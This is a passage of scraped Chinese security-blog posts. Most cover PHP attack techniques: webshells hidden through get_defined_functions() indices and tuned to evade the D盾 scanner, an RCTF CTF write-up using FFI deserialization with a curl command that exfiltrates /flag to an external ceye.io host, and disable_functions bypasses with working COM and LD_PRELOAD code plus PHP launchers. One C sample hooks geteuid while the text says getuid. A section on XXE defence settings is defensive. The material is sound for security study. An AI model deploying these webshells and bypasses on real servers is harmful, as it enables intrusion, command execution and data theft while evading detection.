返回一个多维数组，其中包含所有已定义函数的列表，包括内置（内部）和用户定义。内部函数可以通过\\$arr[“internal”]访问，用户定义的函数可以使用\\$arr[“user”]访问。 这里可以看到，system()函数在internal数组的下标为460，通过\\$arr[“internal”][460]即可访问。 0x02 隐藏WebShell利用get_defined_functions()函数，我们可以通过数组下标来访问的方式实现调用危险函数而无需输入一些敏感危险函数的字符串，从而实现Bypass一些利用正则表达式去文件系统及网络流量上匹配危险函数的安全防护。 常规版自定义了一个callfunc()函数，将system()函数以索引460传入，并在call_user_func_array()函数执行： 12345678910&lt;?phpfunction callfunc() &#123; $func = get_defined_functions(); //函数自己完成所有函数的枚举，成为list $args = func_get_args(); //获取传入参数值 $func_id = array_shift($args); //获取传入的函数所代表的list key $func_name = $func['internal'][$func_id]; //以key来索引函数名 return call_user_func_array($func_name, $args); //调用回调函数，传参执行&#125;echo callfunc(460, \"whoami\");?&gt; 其中func_get_args()函数返回一个包含函数参数列表的数组；array_shift()函数将数组开头的单元移出数组。 访问即可执行shell： 看下免杀效果吧，用D盾是扫不出来的： 变体版按照这个套路我们继续将func_get_args()、array_shift()、call_user_func_array()也用get_defined_functions()函数来调用： 12345678910&lt;?phpfunction callfunc() &#123; $func = get_defined_functions(); $args = $func['internal'][3](); //func_get_args() $func_id = $func['internal'][805]($args); //array_shift() $func_name = $func['internal'][$func_id]; return $func['internal'][556]($func_name, $args); //call_user_func_array()&#125;echo callfunc(460, \"whoami\");?&gt; D盾扫下，好像变复杂就被识别为可疑文件了呢： 当然，我们可以简化一下： 12345678910&lt;?phpfunction f() &#123; $a = get_defined_functions()['internal']; $s = $a[3](); //func_get_args() $b = $a[805]($s); //array_shift() $c = $a[$b]; return $a[556]($c, $s); //call_user_func_array()&#125;echo f(460, \"whoami\");?&gt; D盾再扫下看看，虽然疑似点不一样，但还是识别为了可疑文件： 最终版在变体版的基础上，修改为GET获取参数即可： 12345678910&lt;?phpfunction f() &#123; $a = get_defined_functions()['internal']; $s = $a[3](); $b = $a[805]($s); $c = $a[$b]; return $a[556]($c, $s);&#125;echo f($_GET['id'], $_GET['cmd']);?&gt; URL传参方便多了： D盾还是识别为可疑文件，可自行进行其他的变形。 当然，换成原版的是Bypass D盾的： 12345678910&lt;?phpfunction f() &#123; $a = get_defined_functions()['internal']; $b = func_get_args(); $c = array_shift($b); $d = $a[$c]; return call_user_func_array($d, $b);&#125;echo f($_GET['id'], $_GET['cmd']);?&gt; 0x03 参考get_defined_functions","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"探讨XXE防御之setFeature设置","date":"2019-06-09T01:58:56.000Z","path":"2019/06/09/探讨XXE防御之setFeature设置/","text":"0x01 setFeature小谈setFeature()当我们使用DOM document builder或者SAX parser来解析XML格式的内容时，我们可以使用setFeature()来把一个特性设置为true或者false，从而打开或者关闭这个特性。而对于XXE的防御，正是设置相关feature的开关来实现的。 OWASP推荐的XXE防御以DocumentBuilder的XXE为例，具体代码可看《XML注入之DocumentBuilder与XXE攻击防御&gt;，这里只看下之前示例的XXE防御的setFeature()是设置了哪些特性： 1234factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); 以上设置的4个特性源自OWASP的建议，参考自《XML_External_Entity_Prevention_Cheat_Sheet》，原文解释如下： 12345678910111213141516171819202122// This is the PRIMARY defense. If DTDs (doctypes) are disallowed, almost all // XML entity attacks are prevented// Xerces 2 only - http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-declFEATURE = \"http://apache.org/xml/features/disallow-doctype-decl\";dbf.setFeature(FEATURE, true);// If you can't completely disable DTDs, then at least do the following:// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities// JDK7+ - http://xml.org/sax/features/external-general-entitiesFEATURE = \"http://xml.org/sax/features/external-general-entities\";dbf.setFeature(FEATURE, false);// Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities// Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities// JDK7+ - http://xml.org/sax/features/external-parameter-entitiesFEATURE = \"http://xml.org/sax/features/external-parameter-entities\";dbf.setFeature(FEATURE, false);// Disable external DTDs as wellFEATURE = \"http://apache.org/xml/features/nonvalidating/load-external-dtd\";dbf.setFeature(FEATURE, false); 下面细看下以上几个特性。 几个重要的featuredisallow-doctype-decl防御XXE的最重要的特性，将该特性设置成true后，几乎所有的XML实体攻击都会被成功防御。 http://apache.org/xml/features/disallow-doctype-decl True: A fatal error is thrown if the incoming document contains a DOCTYPE declaration. False: DOCTYPE declaration is allowed. Default: false Since: Xerces-J 2.3.0 我们可以以之前DocumentBuilder的Demo为例，只调用setFeature()将该特性设置为true，然后会发现，只要在XML中尝试定义DOCTYPE的都会报错，因此便不支持解析DTD了，更不用谈后续的利用： external-general-entities该特性指定是否包含外部生成的实体，当设置为false时，不支持解析外部实体。 如果你不能完全禁用DTD，建议开启该特性。 http://xml.org/sax/features/external-general-entities True: Include external general entities. False: Do not include external general entities. Default: true Access: (parsing) read-only; (not parsing) read-write; See: http://xml.org/sax/features/external-parameter-entities 还是之前的例子，只调用setFeature()将该特性设置为false，先尝试解析内部实体，是OK的： 再尝试解析外部实体时，虽然会发送外部请求，但是在SYSTEM解析时就会报错了： external-parameter-entities该特性指定是否包含外部的参数，包括外部DTD子集。当设置为false时，不支持外部参数实体及外部DTD子集。 http://xml.org/sax/features/external-parameter-entities True: Include external parameter entities and the external DTD subset. False: Do not include external parameter entities or the external DTD subset. Default: true Access: (parsing) read-only; (not parsing) read-write; See: http://xml.org/sax/features/external-general-entities 接上一小节的示例，解析外部普通实体时，是可以成功利用的，不存在报错： 但是换种形式，当解析外部参数实体时，就会报错了： load-external-dtd当设置为false时，禁用外部DTD。 http://apache.org/xml/features/nonvalidating/load-external-dtd True: Load the external DTD. False: Ignore the external DTD completely. Default: true Note: This feature is always on when validation is on. See: http://xml.org/sax/features/validation See: http://apache.org/xml/features/nonvalidating/load-dtd-grammar 接着上一小节的示例，尝试解析外部参数实体，是ok的： 但是换成解析外部普通实体时，就报错了： Bypass小结配置补全或出错，如disallow-doctype-decl设置为false等，相当于没防御，看情况而定。 下面就单一的几种设置看看，具体几种的组合的Bypass自行考虑即可： 如果disallow-doctype-decl设置为true，无法Bypass； 如果external-general-entities设置为false，则只能解析内部实体而无法解析外部实体，此时能利用的只有XXE DoS攻击，但要看具体的JDK版本； 如果external-parameter-entities设置为false，则解析内部实体、外部普通实体而无法解析外部参数实体，此时可以进行外部普通实体的形式来攻击或者XXE DoS； 如果load-external-dtd设置为false，则解析内部实体、外部参数实体而无法解析外部普通实体，此时可以进行外部参数实体的形式来攻击或者XXE DoS； 0x02 参考Feature XML_External_Entity_Prevention_Cheat_Sheet","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"XML注入","slug":"XML注入","permalink":"https://www.mi1k7ea.com/tags/XML注入/"}]},{"title":"从RCTF nextphp看PHP7.4的FFI绕过disable_functions","date":"2019-06-07T08:27:45.000Z","path":"2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/","text":"0x01 题目分析访问页面，显示源码，是个PHP一句话木马： 123456&lt;?phpif (isset($_GET['a'])) &#123; eval($_GET['a']);&#125; else &#123; show_source(__FILE__);&#125; 推测，考察Bypass disable_functions。 通过?a=phpinfo();查看phpinfo，发现PHP版本为7.4，且open_basedir限制为Web目录： 而disable_functions中不仅过滤了所有PHP命令执行函数，还过滤了mail、dl、putenv等函数： 1set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl Bypass disable_functions的方法无非就那几种。黑名单是无法绕过了，因为所有PHP命令执行函数都被严格过滤了；系统是Linux，不存在COM组件绕过；过滤了dl()函数，无法通过扩展库绕过；过滤了mail和putenv等函数，无法通过LD_PRELOAD方式绕过；过滤了pcntl相关函数，无法通过该组件绕过；系统没有ImageMagick组件等等…… 暂时没有思路，那就看下当前Web目录下有啥文件，此时只能查看Web目录，因为open_basedir限制了： 1?a=print_r(scandir(&apos;./&apos;)); 可以看到有个preload.php。 难道就没办法Bypass open_basedir了吗？——使用glob://伪协议 下面通过glob://伪协议来Bypass open_basedir读取根目录有啥内容，发送之前先进行URL编码： 1$a=new DirectoryIterator(\"glob:///*\");foreach($a as $f)&#123;echo($f-&gt;__toString().' ');&#125;; 可以看到根目录下有个flag，这里读是读不到的，但是已经确定了flag在根目录下： 回到之前，看下preload.php的源码： 12345?a=show_source(&apos;preload.php&apos;);?a=echo(readfile(&apos;preload.php&apos;));?a=print_r(readfile(&apos;preload.php&apos;));?a=echo(file_get_contents(&apos;preload.php&apos;));?a=print_r(file_get_contents(&apos;preload.php&apos;)); 源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfinal class A implements Serializable &#123; protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'print_r', 'arg' =&gt; '1' ]; private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); &#125; public function __serialize(): array &#123; return $this-&gt;data; &#125; public function __unserialize(array $data) &#123; array_merge($this-&gt;data, $data); $this-&gt;run(); &#125; public function serialize (): string &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125; public function __get ($key) &#123; return $this-&gt;data[$key]; &#125; public function __set ($key, $value) &#123; throw new \\Exception('No implemented'); &#125; public function __construct () &#123; throw new \\Exception('No implemented'); &#125;&#125; 分析下这段代码：A类继承了Serializable类，和Java类似，定义了一个可序列化的类；A类有一个成员变量\\$data，是一个数组，数组中是字典，键分别保存了ret、func、arg；新增了__serialize()和__unserialize()函数，未见过的写法，其中__unserialize()和unserialize()均调用了run()函数；__set()和__construct()函数都抛出异常，这里主要是__set()，因为我们无法直接通过set的方式来设置\\$data的值了；最后是run()函数，它是反序列化漏洞存在的根源，因为它通过成员变量\\$data中的func和arg来实现任意函数调用： 1$this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); 至此，之前Bypass disable_functions的方法自然是用不了了。但题目是nextphp，PHP版本为7.4且根据其未见过的一些特性可以推测出应该是用到了7.4版本的新特性了。 0x02 PHP 7.4 新特性自定义对象序列化在PHP 7.4的时候，增加了__serialize()和__unserialize()函数，可以用来自定义对象的序列化。其实和Java重写readObject()方法类似。 Preload预加载，允许服务器在启动时在内存中加载PHP文件，并使它们永久可用于所有后续请求，主要用来大幅提升IO性能。 在php.ini中有一项设置名为opcache.preload，用来指定将在服务器启动时编译和执行的PHP文件，文件中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用。 在本题的phpino中可以看到该设置选项： 可以看到，该选项设置为preload.php，也就是说服务器在启动时就已经将该文件加载进内存中，后续我们可以直接调用该文件中的类方法即可而无需做多余的操作去加载或包含文件进来。 FFIFFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。 FFI的使用分为声明和调用两个部分。 下面看个简单的使用Demo，从共享库中调用printf()函数： 12345678&lt;?php// create FFI object, loading libc and exporting function printf()$ffi = FFI::cdef( \"int printf(const char *format, ...);\", // this is a regular C declaration \"libc.so.6\");// call C's printf()$ffi-&gt;printf(\"Hello %s!\\n\", \"world\");?&gt; FFI::cdef——创建一个新的FFI对象，可以用于常规C代码的声明，第一个参数为需要声明的C代码，第二个参数为可选项、从哪个共享库中导入；后面直接通过FFI变量调用声明过的C函数即可。 可在phpinfo中查看FFI是否开启，本题是开启的： 0x03 解题思路由前面分析可知以下几点可利用的地方： Preload配置已经将preload.php预加载到内存中，可直接利用其中的类方法； preload.php中的unserialize()函数会调用run()，而run()存在任意函数调用风险； index.php中eval会执行PHP代码，会帮助我们执行preload.php中的反序列化操作； 结合起来，攻击思路如下： 先利用FFI特性构造恶意序列化内容，用PHP通过FFI声明和调用C中的system()函数； 利用index.php中的eval来执行反序列化操作； 最后调用FFI中声明的system()函数执行命令； 利用FFI的特性构造恶意序列化内容，因为无法直接通过__set()函数设置成员变量\\$data，这里就直接修改其键值即可，使其初始化func的初始值为FFI::cdef、arg的初始值为system： 123456789101112131415161718192021222324&lt;?phpfinal class A implements Serializable &#123; protected $data = [ 'ret' =&gt; null, 'func' =&gt; 'FFI::cdef', 'arg' =&gt; 'int system(char *command);' ]; private function run () &#123; $this-&gt;data['ret'] = $this-&gt;data['func']($this-&gt;data['arg']); &#125; public function serialize () &#123; return serialize($this-&gt;data); &#125; public function unserialize($payload) &#123; $this-&gt;data = unserialize($payload); $this-&gt;run(); &#125;&#125;echo(serialize(new A()));?&gt; 得到如下序列化内容： 1C:1:&quot;A&quot;:89:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:26:&quot;int system(char *command);&quot;;&#125;&#125; 构造exp如下，这里利用index.php的eval来限制执行反序列化操作，然后触发run()函数来调用FFI::cdef声明C中的system()函数，然后通过FFI变量调用已声明的system()来执行任意命令，因为可能有特殊编码这里就进行base64加密传送回来： 1$a=unserialize('C:1:\"A\":89:&#123;a:3:&#123;s:3:\"ret\";N;s:4:\"func\";s:9:\"FFI::cdef\";s:3:\"arg\";s:26:\"int system(char *command);\";&#125;&#125;');$a-&gt;ret-&gt;system('curl xx.ceye.io/?c=`cat /flag|base64`'); 发送之前，先进行URL编码，最后在ceye收到内容，base64解码即为flag： 小结 本题巧妙利用了PHP 7.4的新特性FFI来Bypass disable_functions。 当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。 也就是说，通过PHP调用C的命令执行函数来绕过。 0x04 参考Foreign Function Interface","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"浅谈几种Bypass disable_functions的方法","date":"2019-06-02T10:07:10.000Z","path":"2019/06/02/浅谈几种Bypass-disable-functions的方法/","text":"Bypass disable_functions的方法有很多，这里先将一些常用的方法小结一下，后面会继续补充各种方法。 0x01 disable_functionsdisable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，通常是网站管理员为了安全起见，用来禁用某些危险的命令执行函数等。 我们查看phpinfo的时候，会发现有这么一栏，我本地这里默认是未设置的： 要更改的话打开php.ini，找到对应的行修改即可，这里修改如下： 1234; This directive allows you to disable certain functions for security reasons.; It receives a comma-delimited list of function names.; http://php.net/disable-functionsdisable_functions = exec,system,passthru,shell_exec,proc_open,popen,dl, 注意：eval并非PHP函数，放在disable_functions中是无法禁用的，若要禁用需要用到PHP的扩展Suhosin。 然后重启服务，在phpinfo中可以看到已经生效： 下面就逐一对各种方法进行简单的归纳。 0x02 黑名单绕过我们知道，disable_functions其实是一个黑名单机制，我们可以通过观察是否存在可利用的漏网之鱼，直接通过其实现绕过即可。 …… 0x03 利用Windows系统组件COM绕过Windows系统组件COM在Windows默认就存在，是位于System32目录下的wshom.ocx文件。 环境配置先在php.ini中查看是否已经开启com.allow_dcom，若未开启则将前面的;分号去掉： 123; allow Distributed-COM calls; http://php.net/com.allow-dcomcom.allow_dcom = true 然后在php/ext/里面查找是否存在php_com_dotnet.dll这个文件。 再到php.ini中查看是否存在extension=php_com_dotnet.dll这项，有的话去掉注释开启，否则直接添加上去即可。 重启服务，在phpinfo中查看是否开启了： Bypass前提通过phpinfo知道disable_functions选项如下： 1disable_functions = exec,system,passthru,shell_exec,proc_open,popen,dl, 此时在Web服务器中写入任意的以上函数的WebShell都是无法执行命令的。 上传comshell.php至Web服务器中： 12345678&lt;?php$command = $_GET['cmd'];$wsh = new COM('WScript.shell'); // 生成一个COM对象 Shell.Application也能$exec = $wsh-&gt;exec(\"cmd /c\".$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput;?&gt; 这里创建一个COM对象，然后通过调用COM对象的exec()方法来实现执行系统命令，从而绕过disable_functions禁用PHP命令执行函数的限制： 防御方法彻底的解决方案是直接删除System32目录下wshom.ocx文件。 0x04 利用LD_PRELOAD绕过LD_PRELOAD是Linux中的环境变量，可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号。即可以通过重定向共享库函数来进行运行时修复。这项技术可用于绕过反调试代码，也可以用作用户机rootkit。 Method1——劫持getuid()基本原理前提是在Linux中已安装并启用sendmail程序。 php的mail()函数在执行过程中会默认调用系统程序/usr/sbin/sendmail，而/usr/sbin/sendmail会调用getuid()。如果我们能通过LD_PRELOAD的方式来劫持getuid()，再用mail()函数来触发sendmail程序进而执行被劫持的getuid()，从而就能执行恶意代码了。 细化一下： 编写一个原型为 uid_t getuid(void); 的 C 函数，内部执行攻击者指定的代码，并编译成共享对象 evil.so； 运行 PHP 函数 putenv()，设定环境变量 LD_PRELOAD 为 evil.so，以便后续启动新进程时优先加载该共享对象； 运行 PHP 的 mail() 函数，mail() 内部启动新进程 /usr/sbin/sendmail，由于上一步 LD_PRELOAD 的作用，sendmail 调用的系统函数 getuid() 被优先级更好的 evil.so 中的同名 getuid() 所劫持； 达到不调用 PHP 的各种命令执行函数（system()、exec() 等等）仍可执行系统命令的目的。 调用过程分析先调用如下命令可查看sendmail程序可能调用的系统API明细： 12root@sq:/tmp# readelf -Ws /usr/sbin/sendmail | grep getuid 90: 0000000000000000 0 FUNC GLOBAL DEFAULT UND getuid@GLIBC_2.2.5 (3) 或如下命令也可： 12root@sq:/tmp# nm -D /usr/sbin/sendmail 2&gt;&amp;1 | grep getuid U getuid 由于程序运行时会根据命令行选项、运行环境作出不同反应，导致真正运行时调用的API可能只是readelf查看的子集，通过如下命令跟踪查看sendmail程序的实际API调用情况： 123456789101112root@sq:/tmp# strace -f /usr/sbin/sendmail 2&gt;&amp;1 | grep -A5 -B5 getuidfstat(3, &#123;st_mode=S_IFCHR|0666, st_rdev=makedev(1, 9), ...&#125;) = 0getrusage(0x1 /* RUSAGE_??? */, &#123;ru_utime=&#123;0, 0&#125;, ru_stime=&#123;0, 4000&#125;, ...&#125;) = 0read(3, \"#\\315o=\\302\\4\\363h\\252\\273\\332R\\364\\261skcQ\\267|B&amp;j\\177\\210\\330q\\0379\\f\\7\\216\", 32) = 32read(3, \"\\351o\\235\\336\\220\\364BVj\\346\\261\\244\\200\\34S\\207\\332f\\230\\231\\234V*\\302BHg\\304\\3108jK\", 32) = 32read(3, \"9\\21\\203\\254\\35,\\306\\241\", 8) = 8getuid() = 0getgid() = 0getrlimit(RLIMIT_NOFILE, &#123;rlim_cur=65535, rlim_max=65535&#125;) = 0fstat(0, &#123;st_mode=S_IFCHR|0600, st_rdev=makedev(136, 2), ...&#125;) = 0fstat(1, &#123;st_mode=S_IFIFO|0600, st_size=0, ...&#125;) = 0fstat(2, &#123;st_mode=S_IFIFO|0600, st_size=0, ...&#125;) = 0 可以看到，sendmail程序确实调用了getuid()函数。 接着用man 2 getuid查看函数原型： 现在知道sendmail程序会调用getuid()函数以及getuid()函数的原型，剩下的问题就是寻找在PHP中除了那些命令执行函数外会调用sendmail程序的函数了。 sendmail程序，顾名思义，就是发送邮件的功能，由此自然而然地联想到PHP的mail()函数，写段测试代码： 123&lt;?phpmail('a', 'b', 'c', 'd');?&gt; 然后运行如下命令查看mail()是否启动新进程： 12345678910111213141516root@sq:/tmp# strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execveexecve(\"/usr/bin/php\", [\"php\", \"mail.php\"], [/* 24 vars */]) = 0brk(NULL) = 0x562bdab47000access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)--[pid 29094] &lt;... dup2 resumed&gt; ) = 0[pid 29093] wait4(29094, &lt;unfinished ...&gt;[pid 29094] execve(\"/bin/sh\", [\"sh\", \"-c\", \"/usr/sbin/sendmail -t -i \"], [/* 24 vars */]) = 0[pid 29094] brk(NULL) = 0x557087f3b000[pid 29094] access(\"/etc/ld.so.nohwcap\", F_OK) = -1 ENOENT (No such file or directory)--strace: Process 29095 attached[pid 29094] wait4(-1, &lt;unfinished ...&gt;[pid 29095] execve(\"/usr/sbin/sendmail\", [\"/usr/sbin/sendmail\", \"-t\", \"-i\"], [/* 24 vars */]) = 0[pid 29095] brk(NULL) = 0xe2b000[pid 29095] fcntl(0, F_GETFD) = 0 简单分析一下，第一个execve是启动PHP解释器而已，除此之外必须找到第二个execve，没有则说明并未启动新进程；这里第二和第三个execve都是直接或间接调用系统sendmail程序，这就对了。 注意一点，通过/bin/sh方式调用sendmail的execve，我们在看/bin/sh程序的调用哪些API时会发现，其实也是调用了getuid()： 123456789101112root@sq:/tmp# strace -f /bin/sh 2&gt;&amp;1 | grep -A5 -B5 getuidarch_prctl(ARCH_SET_FS, 0x7fed795b5700) = 0mprotect(0x7fed79392000, 16384, PROT_READ) = 0mprotect(0x5567a6f01000, 8192, PROT_READ) = 0mprotect(0x7fed795c1000, 4096, PROT_READ) = 0munmap(0x7fed795b7000, 37845) = 0getuid() = 0getgid() = 0getpid() = 29796rt_sigaction(SIGCHLD, &#123;0x5567a6cf5540, ~[RTMIN RT_1], SA_RESTORER, 0x7fed790074b0&#125;, NULL, 8) = 0geteuid() = 0brk(NULL) = 0x5567a87fe000 也就是说，如果别的环境和我本地的一样，在mail()中存在启动execve调用了/bin/sh程序来间接调用sendmail的这种情况，即使目标系统未安装或未开启sendmail程序，我仍然可以通过PHP的mail()函数来触发调用了/bin/sh程序的execve，从而调用getuid()达到执行劫持函数的目的。 攻击利用编写test.c，劫持getuid()函数，获取LD_PRELOAD环境变量并预加载恶意的共享库，再删除环境变量 LD_PRELOAD，最后执行由EVIL_CMDLINE环境变量获取的系统命令： 12345678910#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int geteuid() &#123; const char* cmdline = getenv(\"EVIL_CMDLINE\"); if (getenv(\"LD_PRELOAD\") == NULL) &#123; return 0; &#125; unsetenv(\"LD_PRELOAD\"); system(cmdline);&#125; 当这个共享库中的getuid()被调用时，尝试加载payload()函数执行命令。 接着用以下语句编译C文件为共享对象文件： 1gcc -shared -fPIC test.c -o test.so 最后编写test.php： 12345678910111213&lt;?php echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://test.com/exp.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/exp.so &lt;/p&gt;\"; $cmd = $_GET[\"cmd\"]; $out_path = $_GET[\"outpath\"]; $evil_cmdline = $cmd . \" &gt; \" . $out_path . \" 2&gt;&amp;1\"; echo \"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: \" . $evil_cmdline . \"&lt;/p&gt;\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); mail(\"\", \"\", \"\", \"\"); echo \"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;\" . nl2br(file_get_contents($out_path)) . \"&lt;/p&gt;\"; unlink($out_path);?&gt; 这里接受3个参数，一是cmd参数，待执行的系统命令；二是outpath参数，保存命令执行输出结果的文件路径，便于在页面上显示，另外该参数，你应注意web是否有读写权限、web是否可跨目录访问、文件将被覆盖和删除等几点；三是sopath参数，指定劫持系统函数的共享对象的绝对路径。 这里通过putenv()函数将LD_PRELOAD环境变量设置为恶意的test.so、将自定义的EVIL_CMDLINE环境变量赋值为要执行的命令；然后调用mail()函数触发sendmail()，再通过sendmail()触发getuid()从而使恶意的test.so被加载执行；最后再输出内容到页面上并删除临时存放命令执行结果的文件。 访问test.php，输入相应的参数即可执行成功： 其实本地测试发现，即使Linux系统未安装或未启用sendmail，还是能够成功触发Bypass，这和前面分析的mail()会启动/bin/sh进而调用getuid()有关，验证了这种方法的特殊性。 Method2——劫持启动进程基本原理第一种方法是劫持getuid()，是较为常用的方法，但存在缺陷： 目标Linux未安装或为启用sendmail； 即便目标可以启用sendmail，由于未将主机名添加进hosts中，导致每次运行sendmail都要耗时半分钟等待域名解析超时返回，www-data也无法将主机名加入hosts； 回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！ GCC 有个 C 语言扩展修饰符 __attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute__((constructor)) 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为。 此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 unsetenv(&quot;LD_PRELOAD&quot;)，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 extern char** environ！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。 攻击利用bypass_disablefunc.c 123456789101112131415161718192021222324252627#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;extern char** environ;__attribute__ ((__constructor__)) void preload (void)&#123; // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) &#123; if (strstr(environ[i], \"LD_PRELOAD\")) &#123; environ[i][0] = '\\0'; &#125; &#125; // executive command system(cmdline);&#125; 接着用以下语句编译C文件为共享对象文件： 1gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so bypass_disablefunc.php，代码和test.php一致： 12345678910111213&lt;?php echo \"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;\"; $cmd = $_GET[\"cmd\"]; $out_path = $_GET[\"outpath\"]; $evil_cmdline = $cmd . \" &gt; \" . $out_path . \" 2&gt;&amp;1\"; echo \"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: \" . $evil_cmdline . \"&lt;/p&gt;\"; putenv(\"EVIL_CMDLINE=\" . $evil_cmdline); $so_path = $_GET[\"sopath\"]; putenv(\"LD_PRELOAD=\" . $so_path); mail(\"\", \"\", \"\", \"\"); echo \"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;\" . nl2br(file_get_contents($out_path)) . \"&lt;/p&gt;\"; unlink($out_path);?&gt; 访问bypass_disablefunc.php，输入参数设置LD_PRELOAD环境变量和要执行的命令的值，页面直接返回命令执行结果： 0x05 利用PHP 7.4 FFI绕过FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。简单地说，就是一项让你在PHP里能够调用C代码的技术。 当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。 也就是说，通过PHP调用C的命令执行函数来绕过。 具体原理和利用可参考《从RCTF nextphp看PHP7.4的FFI绕过disable_functions》。 0x06 利用Bash破壳（CVE-2014-6271）漏洞绕过前提条件这种利用方法的前提是目标OS存在Bash破壳（CVE-2014-6271）漏洞，该漏洞的具体介绍可参考《破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一 》。 在我本地的Metasploitable2虚拟机环境中，是存在Bash破壳漏洞的： 基本原理假设目标OS存在Bash破壳漏洞后，我们再来看看PHP到底是哪些函数调用触发到了Bash博客漏洞的。 这里我们以mail()函数作为例子，当然其他一些函数也可以，原理一致，可以自行分析。 PHP的mail()函数用于发送邮件，提供了3个必选参数和2个可选参数： 1mail ( string $to , string $subject , string $message [, string $additional_headers [, string $additional_parameters ]] ) : bool 这里我们主要看最后一个参数，PHP官方手册上对最后一个参数的说明： The additional_parameters parameter can be used to pass an additional parameter to the program configured to use when sending mail using the sendmail_path configuration setting. For example, this can be used to set the envelope 